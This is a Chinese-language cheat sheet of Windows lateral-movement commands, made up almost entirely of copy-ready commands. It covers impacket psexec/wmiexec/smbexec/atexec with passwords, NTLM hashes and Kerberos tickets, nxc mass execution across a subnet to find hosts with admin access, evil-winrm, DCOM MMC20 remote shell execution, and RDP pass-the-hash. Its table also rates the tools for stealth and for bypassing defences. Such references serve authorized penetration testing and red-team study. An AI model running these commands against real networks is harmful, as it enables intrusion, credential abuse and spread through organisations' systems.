# 横向移动工具命令对照

---

## 选择矩阵

| 工具 | 认证方式 | 端口 | 权限 | 特点 |
|---|---|---|---|---|
| psexec | 密码/Hash | 445 | SYSTEM | 写服务+SMB，最常用 |
| wmiexec | 密码/Hash | 135+高端口 | admin | 不写磁盘，较隐蔽 |
| smbexec | 密码/Hash | 445 | SYSTEM | 不需Admin$ |
| atexec | 密码/Hash | 445 | SYSTEM | 通过计划任务 |
| evil-winrm | 密码/Hash | 5985 | admin | PS shell，上传下载 |
| DCOM | 密码 | 135+高端口 | admin | 不常用，绕防御 |
| RDP | 密码/Hash* | 3389 | GUI | 需Restricted Admin做PTH |

## impacket全家桶

```
# 密码认证
impacket-psexec corp.com/admin:'pass'@TARGET
impacket-wmiexec corp.com/admin:'pass'@TARGET
impacket-smbexec corp.com/admin:'pass'@TARGET
impacket-atexec corp.com/admin:'pass'@TARGET 'whoami'

# Hash认证（PTH）
impacket-psexec -hashes :NTHASH corp.com/admin@TARGET
impacket-wmiexec -hashes :NTHASH corp.com/admin@TARGET

# Kerberos认证（PTT/Overpass）
export KRB5CCNAME=admin.ccache
impacket-psexec -k -no-pass corp.com/admin@TARGET.corp.com
```

## nxc批量

```
# 批量命令执行
nxc smb TARGETS -u admin -p 'pass' -x 'whoami'                 # cmd
nxc smb TARGETS -u admin -p 'pass' -X 'Get-Process'            # PowerShell
nxc smb TARGETS -u admin -H NTHASH -x 'whoami'                 # PTH

# 判断哪些机器有管理权限
nxc smb 192.168.50.0/24 -u admin -p 'pass'
# (Pwn3d!) = 有本地管理权限
```

## WinRM

```
evil-winrm -i TARGET -u admin -p 'pass'
evil-winrm -i TARGET -u admin -H NTHASH

# 内置PS remoting
$cred = New-Object PSCredential("admin", (ConvertTo-SecureString "pass" -AsPlainText -Force))
Enter-PSSession -ComputerName TARGET -Credential $cred
```

## DCOM

```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","TARGET"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami > C:\temp\out.txt","7")
```

## RDP

```
xfreerdp /u:admin /p:'pass' /v:TARGET /cert-ignore
xfreerdp /u:admin /pth:NTHASH /v:TARGET /cert-ignore    # 需Restricted Admin Mode
```
